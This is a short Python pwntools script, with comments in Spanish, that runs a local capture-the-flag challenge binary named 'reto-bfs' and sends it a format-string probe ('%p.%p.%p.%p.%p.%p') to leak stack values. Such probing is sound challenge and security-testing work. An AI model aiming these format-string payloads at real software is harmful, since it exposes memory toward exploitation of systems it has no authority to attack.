#!/usr/bin/env python3
"""
Prueba local del binario reto-bfs
"""

from pwn import *

context.arch = "i386"

print("[*] Ejecutando reto-bfs localmente...")
p = process("./reto-bfs")

# Esperar la pista
print("\n[*] Recibiendo líneas del binario...")
for i in range(10):
    try:
        line = p.recvline()
        print(f"[{i}] {repr(line)}")
        if b"Ingrese su input" in line:
            break
    except:
        break

# Enviar payload format string
print("\n[*] Enviando payload: %p.%p.%p.%p.%p.%p")
p.sendline(b"%p.%p.%p.%p.%p.%p")

print("\n[*] Respuesta:")
try:
    output = p.recvall(timeout=2)
    print(f"Output:\n{output.decode(errors='replace')}")
except Exception as e:
    print(f"Exception: {e}")
